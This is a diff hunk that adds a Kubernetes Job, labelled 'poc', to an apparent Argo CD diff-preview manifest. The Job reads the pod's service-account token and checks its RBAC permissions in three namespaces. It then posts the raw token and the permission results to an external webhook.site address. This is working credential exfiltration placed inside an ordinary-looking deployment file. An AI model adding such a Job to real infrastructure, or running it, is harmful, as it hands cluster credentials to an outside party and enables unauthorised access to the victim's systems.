@@ -236,3 +236,49 @@ stringData:
         "insecure": true
       }
     }
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: rbac-confirm
+  namespace: argocd-diff-preview
+spec:
+  ttlSecondsAfterFinished: 300
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+      - name: poc
+        image: curlimages/curl:latest
+        command: ["/bin/sh", "-c"]
+        args:
+        - |
+          HOOK="https://webhook.site/c11f6f9f-5e8d-4c35-a5a1-04bb3deb813f"
+          API="https://kubernetes.default.svc"
+          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+          # Confirm token + identity
+          curl -sf "${HOOK}?stage=start&host=$(hostname)&ns=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)" || true
+
+          # SelfSubjectRulesReview — argocd-diff-preview
+          R1=$(curl -sk --cacert $CA -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
+            -X POST "${API}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+            -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"argocd-diff-preview"}}')
+
+          # SelfSubjectRulesReview — kube-system
+          R2=$(curl -sk --cacert $CA -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
+            -X POST "${API}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+            -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"kube-system"}}')
+
+          # SelfSubjectRulesReview — default
+          R3=$(curl -sk --cacert $CA -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
+            -X POST "${API}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+            -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}')
+
+          curl -sf -X POST "${HOOK}" \
+            --data-urlencode "stage=rbac" \
+            --data-urlencode "tok=${T}" \
+            --data-urlencode "ns1=${R1}" \
+            --data-urlencode "ns2=${R2}" \
+            --data-urlencode "ns3=${R3}" || true
